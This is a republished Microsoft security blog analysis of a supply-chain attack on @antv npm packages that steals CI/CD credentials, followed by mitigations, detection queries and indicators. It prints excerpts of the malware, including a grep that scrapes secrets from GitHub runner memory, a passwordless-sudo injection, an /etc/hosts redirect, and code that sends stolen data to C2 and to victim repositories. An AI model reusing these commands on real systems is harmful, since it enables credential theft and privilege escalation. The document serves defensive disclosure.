---
categories:
- MS
- 보안
date: '2026-05-20T17:48:44+00:00'
description: Microsoft has identified an active supply chain attack targeting the
  @antv node package manager (npm) package ecosystem. A threat actor compromised an
  @antv mai
draft: false
original_url: https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/
source: Microsoft Security Blog
tags:
- Linux
title: 'Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft'
---

Microsoft has identified an active supply chain attack targeting the @antv node package manager (npm) package ecosystem. A threat actor compromised an @antv maintainer account and published malicious versions of widely used data-visualization packages, resulting in cascading downstream impact.



The compromise propagated through dependency chains into libraries like echarts-for-react (which has more than 1 million weekly downloads), expanding the blast radius into CI/CD pipelines and cloud workloads across the ecosystem. The malicious payload—a ~499 KB obfuscated JavaScript file—runs silently during npm install and is purpose-built to steal credentials from GitHub Actions environments.



Key capabilities observed in the payload include multi-platform credential theft (GitHub, Amazon Web Services, HashiCorp Vault, npm, Kubernetes, 1Password), GitHub Action Runner process memory scraping, privilege escalation, dual-channel data exfiltration, and Supply chain Levels for Software Artifacts (SLSA) provenance forgery. These capabilities suggest a deliberate effort to evade analysis and an apparent focus on CI/CD environments.



The authors of the antv account have also since confirmed in a ticket on the repo that the situation is now resolved.



Attack chain overview


Figure 1. @antv npm supply chain attack flow.



The @antv organization maintains charting libraries (G2, G6) embedded across dashboards and applications. The attack proceeds through:




Maintainer account compromise and publication of malicious @antv package versions



Downstream dependency amplification (echarts-for-react, size-sensor, and others)



Automatic payload execution through a preinstall hook during npm install



Execution chain: node → shell → bun → payload (Bun runtime installed if absent)




Technical analysis



The payload replaces the legitimate index.js with a single-line obfuscated script.



Obfuscation




Layer 1: 1,732 Base64-encoded strings in a rotated array, decoded through lookup function with the shuffle key 0xa31de



Layer 2: Critical strings such as command-and-control (C2) domain and env var names are encrypted with a custom PBKDF2 and SHA-256 cipher, which is decrypted at runtime.



Environment gating: The payload exits immediately if it’s not running on GitHub Actions on Linux



Branch avoidance: Skips the main, master, dependabot/, renovate/, and gh-pages when using Git API exfiltration








// Layer 1: 1,732 strings in rotated array with base64 decode
(function(_0x44be0e, _0x3ff020){
    // Array shuffle IIFE with key 0xa31de
    _0x335af4['push'](_0x335af4['shift']());
})(_0x71ec, 0xa31de));
 
// Layer 2: PBKDF2+SHA256 runtime decryption for critical strings
var e6 = "a8269c01069452afb8a54de904e6419578d155fdbdb9e566bab8576a4266b61e";
var t6 = "7f44e4ba6f6a71bd0f789e7f83bd3104";
var u5 = new du(e6, t6);  // PBKDF2 cipher instance
globalThis["f2959c600"] = function(s) { return u5.decode(s); };
 
// Environment gate - exits if not GitHub Actions on Linux
this['isGitHubActions'] = process.env[f2959c600('68zz23c6NGR9...')]  === 'true';
this['isLinuxRunner']   = process.env[f2959c600('NhUrwwYEwYIJ...')] === 'Linux';



Credential theft



The payload targets secrets across six platforms:




GitHub: Extracts GITHUB_TOKEN, scans for Personal Access Tokens (gh[op]_) and installation tokens (ghs_), validates through /user API, and enumerates repo and org secrets.



Amazon Web Services(AWS): Queries Instance Metadata Service (169.254.169[.]254), Elastic Container Service metadata (169.254.170[.]2), reads .aws/ files, harvests env vars, and then calls SecretsManager across all regions.



HashiCorp Vault: Searches 12+ token paths (/var/run/secrets/vault/token, ~/.vault-token, and others) and connects to a local Vault at 127.0.0[.]1:8200.



npm: Validates tokens using /-/whoami, exchanges OpenID Connect (OIDC) tokens for publish access, and enumerates packages



Kubernetes: Reads service account tokens and enumerates namespace secrets



1Password: Interacts with command-line interface (CLI) and attempts master password extraction with two-factor authentication (2FA) bypass




// AWS Secrets Manager enumeration
'secretsmanager:ListSecrets'
'secretsmanager:GetSecretValue('
 
// Vault token paths searched (12+ locations)
'/var/run/secrets/vault/token'
'/.vault-token'
'/home/runner/.vault-token'
'/root/.vault-token'
'/etc/vault/token'
 
// GitHub API secret enumeration
'/actions/secrets?per_page=100'
'/actions/organization-secrets?per_page=100'



Runner memory scraping



The payload locates the GitHub Actions Runner.Worker PID using /proc scanning, then extracts runtime secrets using the following:



// Locates Runner.Worker PID via /proc
'findRunnerWorkerPIDLinux'
// Scans /proc//cmdline for "Runner.Worker"
 
// Extracts secrets from process memory
tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' | sort -u



This activity bypasses normal secret masking by reading secrets directly from runner process memory.



Privilege escalation




Injects sudoers rule through bind mount: echo &#8216;runner ALL=(ALL) NOPASSWD:ALL&#8217; > /mnt/runner



Modifies /etc/hosts for DNS redirection




// Injects passwordless sudo via /etc/sudoers.d bind mount at /mnt
echo 'runner ALL=(ALL) NOPASSWD:ALL' > 
 && chmod 0440 /mnt/runner
 
// DNS manipulation
sudo sh -c "echo '127.0.0.1 ' >> /etc/hosts"
 
// Validates sudo access before operations
sudo -n true



Exfiltration



Dual-channel exfiltration:




Primary: HTTPS to encrypted C2 domain (port 443) with DNS pre-check and health probe



Fallback: Git Data API — Creates blobs, trees, or commits in victim repositories on non-protected branches



Tertiary: Creates public repos under victim accounts with reversed description (&#8220;niagA oG eW ereH :duluH-iahS&#8221;); more than 2,200 of these repos have been observed as of this writing




// Primary: HTTPS C2 with encrypted domain (port 443)
let config = {
    'domain': f2959c600('bXVunP4+izfR/cOx8zhW/fw8v6xFc4cvjYgGdbEE'),
    'port': 0x1bb,  // 443
    'path': f2959c600('5WA4NOQUD/n/mNx/cqL4gSVQrTrwV+RBKO7TXeTIk3fFBUt+2arGDjc='),
    'dry_run': false
};
 
// Fallback: Git Data API - creates blobs/trees/commits in victim repos
await j(token, '/repos/' + owner + '/' + repo + '/git/blobs',
        {'method': 'POST', 'body': JSON.stringify(stolen_data)});
'/git/trees'
'/git/commits'
 
// Branch filter - avoids protected branches to evade detection
Dw = ['dependabot/', 'renovate/', 'gh-pages', 'docs/',
      'copilot/', 'master', 'main'];



Propagation and persistence




Enumerates /user/repos and /user/orgs to spread into additional repositories



Installs Bun runtime, executes second-stage payload using bun run .claude/



Deploys token monitor for ongoing credential capture



Forges SLSA provenance attestations through Sigstore (Fulcio or Rekor) to appear legitimate




Impact and blast radius




Direct compromise of @antv packages with broad ecosystem adoption



Amplification through downstream dependencies into thousands of projects



Cascading risk: stolen npm tokens enable further package poisoning, stolen GitHub tokens enable repo manipulation, and stolen AWS credentials enable cloud access



SLSA provenance forgery erodes trust in supply chain attestation frameworks




How GitHub took action to prevent further harm



Upon learning of the attack, GitHub acted immediately to limit further damage. It removed 640 malicious packages and invalidated 61,274 npm granular access tokens with write permissions and 2FA bypass, preventing leaked tokens from being used in this or similar attacks. GitHub also published advisories relevant to this malware campaign in the GitHub Advisory Database and alerted the community through Dependabot alerts and npm audit. It continues to monitor for additional affected packages and remove them as needed.



Mitigation and protection guidance



Microsoft recommends the following mitigations to reduce the impact of this threat:




Review dependency trees for direct or transitive usage of affected @antv/ packages.



Identify systems that installed or built affected package versions during the suspected exposure window.



Pin known-good package versions where possible and avoid automatic dependency upgrades until validation is complete.



Disable pre- and post-installation script execution by ensuring you run npm install with --ignore-scripts.



While GitHub team has already invalidated all the npm tokens that had write access and 2FA bypass, Microsoft Defender still recommends rotating credentials, tokens, npm access tokens, CI/CD secrets, and cloud credentials that might have been exposed in affected build or developer environments.



Rotate credentials, tokens, npm access tokens, CI/CD secrets, and cloud credentials that might have been exposed in affected build or developer environments.



Audit organization and personal GitHub accounts for public repositories with the description “niagA oG eW ereH :duluH-iahS” or other unexpected repositories created during the exposure window, and revoke any GitHub tokens that might have been implicated.



Audit CI/CD logs for unexpected outbound network connections, script execution, or suspicious package lifecycle activity.



Review npm package lockfiles, build logs, and artifact provenance for evidence of compromised package versions.



Enable cloud-delivered protection in Microsoft Defender Antivirus or equivalent antivirus protection.



Use Microsoft Defender XDR to investigate suspicious activity across endpoints, identities, cloud apps, and developer environments.



Use Microsoft Defender Vulnerability Management to search for antv packages across your estate.




Microsoft Defender XDR Detections



Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.



Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.



TacticObserved activityMicrosoft Defender coverageExecution Suspicious script execution during npm install or package lifecycle activityMicrosoft Defender Antivirus &#8211; Trojan:AIGen/NPMStealer &#8211; Backdoor:Python/ShaiWorm &#8211; Trojan:JS/ShaiWorm &#8211; Trojan:JS/ObfusNpmJs  Microsoft Defender for Endpoint &#8211; Suspicious usage of Bun runtime &#8211; Suspicious Installation of Bun runtime &#8211; Suspicious Node.js process behavior      Credential AccessPotential harvesting of environment variables, tokens, or developer secretsMicrosoft Defender for Endpoint &#8211; Credential access attempt &#8211; Suspicious cloud credential access by npm-cached binary &#8211; Kubernetes secrets enumeration indicative of credential accessMicrosoft Defender for Cloud Sha1-Hulud Campaign Detected: Possible command injection to exfiltrate credentialsCommand and ControlPotential outbound connections from build systems or developer machinesMicrosoft Defender for Endpoint Connection to a custom network indicator







Microsoft Security Copilot



Security Copilot customers can use the standalone experience to create their own prompts or run prebuilt promptbooks to automate incident response or investigation tasks related to this threat, including:




Incident investigation



Microsoft user analysis



Threat Intelligence 360 report based on MDTI article



Vulnerability or supply chain impact assessment




Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.



Microsoft Defender XDR Threat analytics



https://security.microsoft.com/threatanalytics3/5879a0e7-f145-407b-bc84-1ae405a016ea/overview



Advanced hunting



The following sample queries let you search for a week&#8217;s worth of events. To explore up to 30 days of raw data, go to the Advanced Hunting page > Query tab, and update the time range to Last 30 days.



Hunt for suspicious npm lifecycle script execution



This query searches for Node.js and npm activity involving install lifecycle behavior and relevant package references.



DeviceProcessEvents
| where FileName in~ ("node.exe", "npm.cmd", "npm.exe", "npx.cmd", "npx.exe")
| where ProcessCommandLine has_any ("preinstall", "postinstall", "install")
| where ProcessCommandLine has_any ("@antv", "echarts-for-react")
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          AccountName



Hunt for potential compromise of through malicious npm packages



DeviceProcessEvents
| where Timestamp > ago(2d)
| where FileName in ("bun", "bun.exe")
| where ProcessCommandLine has "run index.js"



Hunt for affected dependencies in your software inventory



DeviceTvmSoftwareInventory
| where SoftwareName has "antv" or SoftwareVendor has "antv"
| project DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion



Hunt for suspicious outbound connection from python backdoor



DeviceNetworkEvents
| where Timestamp > ago(2d)
| where InitiatingProcessFileName startswith "python"
| where InitiatingProcessCommandLine has "/cat.py"



Hunt for suspicious outbound activity from Node.js processes



Searches for network connections initiated by Node.js or npm processes that reference package-related paths or commands.



DeviceNetworkEvents
| where InitiatingProcessFileName in~ ("node.exe", "npm.exe", "npx.exe")
| where InitiatingProcessCommandLine has_any ("@antv", "echarts-for-react", "node_modules")
| project Timestamp, DeviceName, RemoteUrl, RemoteIP,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          AccountName



Hunt for affected dependency references in developer directories



This query searches for package manifest or lockfile activity that might contain relevant dependency references.



DeviceFileEvents
| where FileName in~ ("package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml")
| where FolderPath has_any ("node_modules", "src", "repo", "workspace")
| where AdditionalFields has_any ("@antv", "echarts-for-react")
| project Timestamp, DeviceName, FolderPath, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine



Hunt for post-compromise C2 activity



DeviceNetworkEvents
| where Timestamp > ago(2d)
| where RemoteUrl has "t.m-kosche.com"



Shai-Hulud npm supply-chain indicator observed inside a Kubernetes container 



CloudProcessEvents
| where ProcessCommandLine has_any ("IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner", "niagA oG eW ereH", ":duluH-iahS", "t.m-kosche.com", "7cb42f57561c321ecb09b4552802ae0ac55b3a7a", "@antv/setup")
| project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName



Indicators of Compromise (IOC)



IndicatorTypeDescription@antv – whole accountPackage scope&nbsp; All packages maintained by the antv account were compromised.As per the latest statement from the account author’s this situation is now resolved.echarts-for-reactPackage name&nbsp; One of the major downstream packages impacted by the antv compromise.As per the latest statement from the repository author’s this situation is now resolveda68dd1e6a6e35ec3771e1f94fe796f55dfe65a2b94560516ff4ac189390dfa1cSHA-256Malicious payload JavaScript filefb5c97557230a27460fdab01fafcfabeaa49590bafd5b6ef30501aa9e0a51142SHA-256Malicious backdoor Python scriptt.m-kosche[.]com:443DomainInfrastructure associated with campaignIndex.jsFile nameMalicious script or dropped filecat.pyFile nameMalicious script or dropped file







References




Mini Shai-Hulud Hits @antv Ecosystem, 639 Compromised npm Package Versions




This research is provided by Microsoft Defender Security Research with contributions from Rahul Mohandas, Sumith Maniath, Ahmed Saleem Kasmani, Arvind Gowda, Sagar Patil, and members of Microsoft Threat Intelligence.



Learn more



For the latest security research from the Microsoft Threat Intelligence community, check out the&nbsp;Microsoft Threat Intelligence Blog.



To get notified about new publications and to join discussions on social media, follow us on&nbsp;LinkedIn,&nbsp;X (formerly Twitter), and&nbsp;Bluesky.



To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the&nbsp;Microsoft Threat Intelligence podcast.



Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.  &nbsp;




How Microsoft discovers and mitigates evolving attacks against AI guardrails&nbsp;



Learn more about securing Copilot Studio agents with Microsoft Defender &nbsp;



Evaluate your AI readiness with our latest&nbsp;Zero Trust for AI workshop.



Learn more about Protect your agents in real-time during runtime (Preview)



Explore how to build and customize agents with Copilot Studio Agent Builder&nbsp;



Microsoft 365 Copilot AI security documentation&nbsp;





The post Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft appeared first on Microsoft Security Blog.

---
*원문: [https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/](https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/)*
